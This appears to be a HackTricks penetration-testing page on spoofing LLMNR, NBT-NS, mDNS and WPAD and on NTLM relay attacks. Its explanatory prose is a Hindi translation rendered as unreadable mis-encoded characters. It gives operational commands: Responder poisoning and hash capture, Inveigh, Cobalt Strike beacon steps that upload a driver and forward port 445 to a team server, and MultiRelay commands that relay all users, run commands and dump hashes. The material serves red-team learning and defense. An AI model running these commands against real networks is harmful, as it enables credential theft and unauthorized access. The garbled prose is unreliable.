# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Network Protocols

### Local Host Resolution Protocols
- **LLMNR, NBT-NS, and mDNS**:
- Microsoft рдФрд░ рдЕрдиреНрдп рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо DNS рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рд╕реНрдерд╛рдиреАрдп рдирд╛рдо рд╕рдорд╛рдзрд╛рди рдХреЗ рд▓рд┐рдП LLMNR рдФрд░ NBT-NS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕реА рддрд░рд╣, Apple рдФрд░ Linux рд╕рд┐рд╕реНрдЯрдо mDNS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред
- рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ UDP рдкрд░ рдЙрдирдХреА рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рдкреНрд░рд╕рд╛рд░рдг рдкреНрд░рдХреГрддрд┐ рдХреЗ рдХрд╛рд░рдг рдЗрдВрдЯрд░рд╕реЗрдкреНрд╢рди рдФрд░ рд╕реНрдкреВрдлрд┐рдВрдЧ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВред
- [Responder](https://github.com/lgandx/Responder) рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ рдХреЛ рдЬрд╛рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдХрд░ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рдЕрдиреБрдХрд░рдг рдкрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### Web Proxy Auto-Discovery Protocol (WPAD)
- WPAD рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдЦреЛрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- рдЦреЛрдЬ DHCP, DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреА рдЬрд╛рддреА рд╣реИ, рдпрд╛ рдпрджрд┐ DNS рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ LLMNR рдФрд░ NBT-NS рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рддреА рд╣реИред
- Responder WPAD рд╣рдорд▓реЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг WPAD рд╕рд░реНрд╡рд░реЛрдВ рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### Responder for Protocol Poisoning
- **Responder** рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ LLMNR, NBT-NS, рдФрд░ mDNS рдХреНрд╡реЗрд░реАрдЬрд╝ рдХреЛ рдЬрд╝рд╣рд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдХреНрд╡реЗрд░реА рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЪрдпрдирд╛рддреНрдордХ рд░реВрдк рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ SMB рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
- рдпрд╣ Kali Linux рдореЗрдВ рдкреВрд░реНрд╡-рд╕реНрдерд╛рдкрд┐рдд рдЖрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ `/etc/responder/Responder.conf` рдкрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- Responder рд╕реНрдХреНрд░реАрди рдкрд░ рдХреИрдкреНрдЪрд░ рдХрд┐рдП рдЧрдП рд╣реИрд╢ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ `/usr/share/responder/logs` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рд╣реЗрдЬрддрд╛ рд╣реИред
- рдпрд╣ IPv4 рдФрд░ IPv6 рджреЛрдиреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред
- Responder рдХрд╛ Windows рд╕рдВрд╕реНрдХрд░рдг [рдпрд╣рд╛рдБ](https://github.com/lgandx/Responder-Windows) рдЙрдкрд▓рдмреНрдз рд╣реИред

#### Running Responder
- рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде Responder рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП: `responder -I <Interface>`
- рдЕрдзрд┐рдХ рдЖрдХреНрд░рд╛рдордХ рдкреНрд░реЛрдмрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП (рд╕рдВрднрд╛рд╡рд┐рдд рджреБрд╖реНрдкреНрд░рднрд╛рд╡реЛрдВ рдХреЗ рд╕рд╛рде): `responder -I <Interface> -P -r -v`
- рдЖрд╕рд╛рди рдХреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП NTLMv1 рдЪреБрдиреМрддрд┐рдпреЛрдВ/рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреА рддрдХрдиреАрдХреЗрдВ: `responder -I <Interface> --lm --disable-ess`
- WPAD рдЕрдиреБрдХрд░рдг рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `responder -I <Interface> --wpad`
- NetBIOS рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ IP рдкрд░ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдПрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЙрдХреНрд╕реА рд╕реНрдерд╛рдкрд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ: `responder.py -I <interface> -Pv`

### DHCP Poisoning with Responder
- DHCP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрдкреВрдл рдХрд░рдирд╛ рдПрдХ рдкреАрдбрд╝рд┐рдд рдХреА рд░реВрдЯрд┐рдВрдЧ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдЬрд╝рд╣рд░ рджреЗ рд╕рдХрддрд╛ рд╣реИ, ARP рдЬрд╝рд╣рд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдзрд┐рдХ рдЫрд┐рдкрд╛ рд╣реБрдЖ рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
- рдпрд╣ рд▓рдХреНрд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдЯреАрдХ рдЬреНрдЮрд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
- рд╣рдорд▓реЗ рдХреЛ рдЪрд▓рд╛рдирд╛: `./Responder.py -I eth0 -Pdv`
- рдпрд╣ рд╡рд┐рдзрд┐ NTLMv1/2 рд╣реИрд╢ рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╡реНрдпрд╡рдзрд╛рди рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рд╡рдзрд╛рдиреАрдкреВрд░реНрд╡рдХ рд╣реИрдВрдбрд▓рд┐рдВрдЧ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

### Capturing Credentials with Responder
- Responder рдЙрдкрд░реЛрдХреНрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдЧрд╛, рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдкреВрдл рдХреА рдЧрдИ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ (рдЖрдорддреМрд░ рдкрд░ NTLMv2 рдЪреБрдиреМрддреА/рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛) рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИред
- NetNTLMv1 рдореЗрдВ рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдХрд░рдиреЗ рдпрд╛ рдЖрд╕рд╛рди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП ESS рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЗрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛рдиреВрдиреА рдФрд░ рдиреИрддрд┐рдХ рд░реВрдк рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдЙрдЪрд┐рдд рдкреНрд░рд╛рдзрд┐рдХрд░рдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдФрд░ рд╡реНрдпрд╡рдзрд╛рди рдпрд╛ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рдмрдЪрддреЗ рд╣реБрдПред

## Inveigh

Inveigh рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рдкреЗрдирдЯреЗрд╕реНрдЯрд░реНрд╕ рдФрд░ рд░реЗрдб рдЯреАрдорд░реНрд╕ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ Windows рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рд╣реИред рдпрд╣ Responder рдХреЗ рд╕рдорд╛рди рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рд╕реНрдкреВрдлрд┐рдВрдЧ рдФрд░ рдореИрди-рдЗрди-рдж-рдорд┐рдбрд▓ рд╣рдорд▓реЗ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реЗ C# рдмрд╛рдЗрдирд░реА рдореЗрдВ рд╡рд┐рдХрд╕рд┐рдд рд╣реБрдЖ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) рдФрд░ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) рдореБрдЦреНрдп рд╕рдВрд╕реНрдХрд░рдг рд╣реИрдВред рд╡рд┐рд╕реНрддреГрдд рдкреИрд░рд╛рдореАрдЯрд░ рдФрд░ рдирд┐рд░реНрджреЗрд╢ [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) рдореЗрдВ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред

Inveigh рдХреЛ PowerShell рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
рдпрд╛ C# рдмрд╛рдЗрдирд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛:
```bash
Inveigh.exe
```
### NTLM Relay Attack

рдпрд╣ рд╣рдорд▓рд╛ SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд▓рдХреНрд╖рд┐рдд рдорд╢реАрди рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрджрд┐ рд╕рдлрд▓ рд╣реЛ рддреЛ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рд╢реЗрд▓ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдкреНрд░рдореБрдЦ рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:
- рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд░рд┐рд▓реЗ рдХрд┐рдП рдЧрдП рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╣реБрдБрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
- SMB рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

#### 445 Port Forwarding and Tunneling

рдЙрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ рд╕реАрдзреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдЪрдп рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ, рдкреЛрд░реНрдЯ 445 рдкрд░ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдФрд░ рдЯрдирд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред [**PortBender**](https://github.com/praetorian-inc/PortBender) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдкреЛрд░реНрдЯ 445 рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рджреВрд╕рд░реЗ рдкреЛрд░реНрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдбреНрд░рд╛рдЗрд╡рд░ рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╣реБрдБрдЪ рдЙрдкрд▓рдмреНрдз рд╣реЛрдиреЗ рдкрд░ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

PortBender рд╕реЗрдЯрдЕрдк рдФрд░ рд╕рдВрдЪрд╛рд▓рди Cobalt Strike рдореЗрдВ:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЙрдкрдХрд░рдг

- **Metasploit**: рдкреНрд░реЙрдХреНрд╕реА, рд╕реНрдерд╛рдиреАрдп рдФрд░ рджреВрд░рд╕реНрде рд╣реЛрд╕реНрдЯ рд╡рд┐рд╡рд░рдг рдХреЗ рд╕рд╛рде рд╕реЗрдЯрдЕрдк рдХрд░реЗрдВред
- **smbrelayx**: SMB рд╕рддреНрд░реЛрдВ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдиреЗ рдФрд░ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдпрд╛ рдмреИрдХрдбреЛрд░ рддреИрдирд╛рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯред
- **MultiRelay**: Responder рд╕реВрдЯ рд╕реЗ рдПрдХ рдЙрдкрдХрд░рдг рдЬреЛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдпрд╛ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдиреЗ, рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдпрд╛ рд╣реИрд╢ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдХрд░рдг рдХреЛ рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ SOCKS рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рдиреЗрдЯрд╡рд░реНрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд╕рд╛рде рднреА рд╣рдорд▓реЗ рд╕рдХреНрд╖рдо рд╣реЛрддреЗ рд╣реИрдВред

### MultiRelay рд╕рдВрдЪрд╛рд▓рди

MultiRelay _**/usr/share/responder/tools**_ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд┐рд╢рд┐рд╖реНрдЯ IPs рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
рдпреЗ рдЙрдкрдХрд░рдг рдФрд░ рддрдХрдиреАрдХреЗрдВ рд╡рд┐рднрд┐рдиреНрди рдиреЗрдЯрд╡рд░реНрдХ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ NTLM Relay рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реНрдпрд╛рдкрдХ рд╕реЗрдЯ рдмрдирд╛рддреА рд╣реИрдВред

### NTLM рд▓реЙрдЧрд┐рди рдХреЛ рдордЬрдмреВрд░ рдХрд░рдирд╛

Windows рдореЗрдВ рдЖрдк **рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЦрд╛рддреЛрдВ рдХреЛ рдордирдорд╛рдиреЗ рдорд╢реАрдиреЛрдВ рдкрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрдврд╝реЗрдВ:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
